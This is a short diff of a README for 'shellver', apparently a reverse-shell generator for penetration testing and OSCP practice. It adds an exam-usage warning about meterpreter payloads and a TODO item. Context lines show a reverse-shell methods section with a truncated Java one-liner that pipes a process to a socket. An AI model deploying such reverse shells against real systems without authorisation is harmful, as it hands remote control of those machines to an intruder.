@@ -70,6 +70,9 @@ When you know that you’re spawning a reverse shell from a Windows system, I su
 rlwrap ./shellver.py shell
 ```
 
+## Warning about usage in OSCP
+You should not use the `msfvenom` payloads that `shellver` creates in your OSCP exam; they use `meterpreter` payloads, so you can only use them on one machine!
+
 # Reverse Shell Methods
 ```
 ╔BASH TCP═══════════════════════════════════════════
@@ -182,6 +185,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 
 # TODO
+- [ ] Remove `msfpc` dependency (doesn’t support every payload I wanted, so I had to implement my own routines anyway)
 - [x] Make it possible to pass custom listeners  
 - [x] Bind to specified interface only (or to all if no LAN IP address was used)  
 - [x] If using [pwncat](https://github.com/calebstewart/pwncat) only show Linux (or universal) reverse shells  
